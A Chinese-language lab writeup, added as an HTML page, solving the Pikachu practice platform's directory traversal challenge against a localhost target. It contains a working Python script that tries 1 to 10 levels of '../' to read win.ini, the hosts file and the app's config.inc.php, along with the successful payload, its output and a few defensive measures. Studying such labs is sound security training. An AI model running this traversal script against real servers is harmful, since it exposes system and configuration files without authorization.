@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-目录遍历(Directory Traversal) Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-目录遍历(Directory Traversal) Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.29 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, 目录遍历, 路径穿越, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - 目录遍历 (Directory Traversal)</li>
+        <li><strong>题目名称：</strong>目录遍历</li>
+        <li><strong>目标：</strong>利用后端未过滤路径穿越符 <code>../</code> 的缺陷，跳出 Web 目录限制，读取服务器上的系统敏感文件（如 Windows 的 <code>win.ini</code>）。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>目录遍历漏洞产生的原因是，Web 应用在读取文件时，允许用户控制文件路径（如通过 URL 的 <code>title</code> 参数）。如果后端未对 <code>../</code> 进行过滤，攻击者就可以利用它跳出 Web 根目录，访问并读取服务器本地的任意文件。</p>
+
+    <div class="diff-box">
+        <strong>手工测试与自动化测试的区别：</strong>
+        <ul>
+            <li><strong>手工测试</strong>：通过浏览器地址栏修改参数，尝试不同层级的 <code>../</code>。效率低，且难以判断需要穿越多少层才能到达系统根目录。</li>
+            <li><strong>自动化测试</strong>：编写 Python 脚本，利用 <code>requests</code> 库批量发送请求，根据响应特征自动判断路径深度和漏洞是否利用成功。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：识别参数</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在页面上右键点击任意一行文本（如 <code>Truman's word!</code>），选择“复制链接地址”。</p>
+            <p><strong>URL 结构：</strong> <code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=truman.php</code>。</p>
+            <p><strong>分析：</strong> 后端通过 GET 请求接收 <code>title</code> 参数，并将其值（<code>truman.php</code>）作为文件路径进行读取。该参数完全由客户端可控。</p>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 脚本进行自动化测试</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在 VS Code 中创建脚本 <code>dir_traversal.py</code>，批量尝试不同层级的路径穿越。</p>
+        </div>
+        <pre class="code-block"><code><span class="code-keyword">import</span> requests
+
+target_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/dir/dir_list.php"</span>
+param_name = <span class="code-string">"title"</span>
+
+target_files = [
+    <span class="code-string">"Windows/win.ini"</span>,
+    <span class="code-string">"Windows/System32/drivers/etc/hosts"</span>,
+    <span class="code-string">"index.php"</span>,
+    <span class="code-string">"inc/config.inc.php"</span>
+]
+
+print(<span class="code-string">"[*] 开始目录遍历自动化测试..."</span>)
+print(<span class="code-string">"-"</span> * 50)
+
+<span class="code-keyword">for</span> depth <span class="code-keyword">in</span> range(1, 11):
+    prefix = <span class="code-string">"../"</span> * depth
+    
+    <span class="code-keyword">for</span> target_file <span class="code-keyword">in</span> target_files:
+        payload = prefix + target_file
+        params = {param_name: payload}
+        
+        <span class="code-keyword">try</span>:
+            r = requests.get(target_url, params=params, timeout=5)
+            
+            <span class="code-keyword">if</span> r.status_code == 200:
+                <span class="code-keyword">if</span> <span class="code-string">"for 16-bit app support"</span> <span class="code-keyword">in</span> r.text:
+                    print(f<span class="code-string">"[+] 成功读取系统文件！层级: {depth} | Payload: {payload}"</span>)
+                    print(f<span class="code-string">"    响应片段: {r.text[:100]}..."</span>)
+                    <span class="code-keyword">break</span>
+                <span class="code-keyword">elif</span> <span class="code-string">"&lt;?php"</span> <span class="code-keyword">in</span> r.text <span class="code-keyword">and</span> <span class="code-string">"failed to open stream"</span> <span class="code-keyword">not in</span> r.text:
+                    print(f<span class="code-string">"[+] 成功读取源码文件！层级: {depth} | Payload: {payload}"</span>)
+                    print(f<span class="code-string">"    响应片段: {r.text[:100]}..."</span>)
+                    <span class="code-keyword">break</span>
+        <span class="code-keyword">except</span> Exception <span class="code-keyword">as</span> e:
+            print(f<span class="code-string">"[!] 请求发生异常: {e}"</span>)
+            
+print(<span class="code-string">"-"</span> * 50)
+print(<span class="code-string">"[*] 测试完成。"</span>)</code></pre>
+        
+        <p class="info-line"><span class="info-label">代码组成详细解释：</span></p>
+        <ul>
+            <li><code>target_url</code>：目标靶场接口的完整地址。</li>
+            <li><code>param_name = "title"</code>：URL 中的参数名，根据浏览器地址栏确认。</li>
+            <li><code>target_files</code>：包含 Windows 系统文件和 Web 源码文件的列表。</li>
+            <li><code>for depth in range(1, 11)</code>：循环尝试 1 到 10 层路径穿越。</li>
+            <li><code>prefix = "../" * depth</code>：根据当前循环层级生成对应数量的 <code>../</code> 字符串。</li>
+            <li><code>params = {param_name: payload}</code>：使用 <code>requests</code> 库自动拼接 URL 参数。</li>
+            <li><code>if "for 16-bit app support" in r.text</code>：特征匹配。如果页面响应包含 <code>win.ini</code> 的开头，判定为成功读取系统文件。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：脚本运行结果与漏洞验证</h3>
+        <div class="payload-box">
+            <p><strong>终端输出：</strong></p>
+            <pre class="code-block"><code>[+] 成功读取系统文件！层级: 10 | Payload: ../../../../../../../../../../Windows/win.ini
+    响应片段: &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chro...
+--------------------------------------------------
+[*] 测试完成。</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">回显分析：</span> 脚本在遍历到第 10 层 <code>../</code> 时，触发了 <code>win.ini</code> 特征匹配，证明成功读取了该系统文件。响应片段开头是 HTML 标签，是因为后端 <code>include()</code> 或读取函数保留了当前页面的 HTML 骨架，但不影响漏洞成立的判定。</p>
+        <p class="info-line"><span class="info-label">成功 Payload：</span> <code>../../../../../../../../../../Windows/win.ini</code></p>
+        <p class="info-line"><span class="info-label">代码组成解释：</span></p>
+        <ul>
+            <li><code>../</code>：目录穿越符，表示上一级目录。连续使用 10 个，用于跳出深层的 Web 目录，到达系统盘根目录。</li>
+            <li><code>Windows/win.ini</code>：目标系统文件。该文件是 Windows 的核心配置文件，常用于验证目录遍历漏洞是否利用成功。</li>
+        </ul>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：手工测试效率低下。</strong>在浏览器地址栏手动输入不同数量的 <code>../</code> 时，不仅繁琐，而且无法准确判断需要穿越多少层才能到达系统根目录。<br>
+        <strong>解决办法：</strong> 放弃手工测试，编写 Python 脚本批量尝试 1 到 10 层路径穿越，通过特征匹配（<code>for 16-bit app support</code>）自动定位正确的层级和 Payload。</li>
+        <li><strong>坑2：响应片段开头包含 HTML 标签的误判。</strong>脚本输出结果显示响应片段开头为 <code>&lt;!DOCTYPE html&gt;</code>，容易让人误以为没有读到系统文件。<br>
+        <strong>原因排查：</strong> 后端在读取文件内容时，保留了当前页面原有的 HTML 结构，将 <code>win.ini</code> 的内容嵌入在了 HTML 源码的某处。通过特征匹配（搜索 <code>win.ini</code> 的独特内容）可以准确判断漏洞是否成功，而不应仅依赖响应开头的字符串。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>漏洞本质：</strong>目录遍历的本质是“输入未过滤”。后端过度信任客户端提交的文件路径，导致攻击者能够利用 <code>../</code> 跳出预期的目录限制。</li>
+        <li><strong>防御措施：</strong>禁止在文件路径参数中使用 <code>../</code> 或绝对路径；使用白名单机制，只允许包含特定的文件名或扩展名；使用 <code>basename()</code> 函数剥离路径信息。</li>
+        <li><strong>实战启发：</strong>遇到文件读取、下载等功能时，应优先测试目录遍历。对于路径层级未知的情况，使用 Python 自动化脚本遍历深度是一种高效且准确的方法。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
